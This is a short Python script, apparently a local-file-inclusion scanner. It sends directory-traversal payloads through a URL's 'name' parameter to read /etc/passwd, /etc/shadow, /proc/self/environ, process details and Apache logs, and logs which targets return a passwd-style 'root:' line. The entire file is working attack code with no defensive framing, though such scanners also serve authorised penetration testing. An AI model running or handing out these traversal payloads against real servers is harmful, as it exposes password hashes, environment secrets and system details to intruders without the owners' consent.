import requests

def lfi_scan(url):
    vulnerabilities = []
    log_text = ""

    try:
        response = requests.get(url)
        if "name" in response.text:
            payloads = [
                "../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../etc/hosts",
                "../../../../../../../../../../etc/shadow",
                "../../../../../../../../../../etc/issue",
                "../../../../../../../../../../proc/self/environ",
                "../../../../../../../../../../proc/version",
                "../../../../../../../../../../proc/cmdline",
                "../../../../../../../../../../var/log/apache2/access.log",
            ]
            
            for payload in payloads:
                payload_url = f"{url}?name={payload}"
                response = requests.get(payload_url)
                log_text += f"Payload: {payload}, URL: {payload_url}, Status: "
                if response.status_code == 200:
                    if "root:" in response.text or "root:x:" in response.text:
                        vulnerabilities.append((payload, payload_url, "Pass"))
                        log_text += "Pass\n"
                    else:
                        log_text += "Fail\n"

    except Exception as e:
        print(f"Error scanning {url}: {e}")

    # Write log text to file
    log_file = f"{url.split('//')[1]}_lfi_log.txt"
    with open(log_file, "w") as f:
        f.write(log_text)

    return vulnerabilities
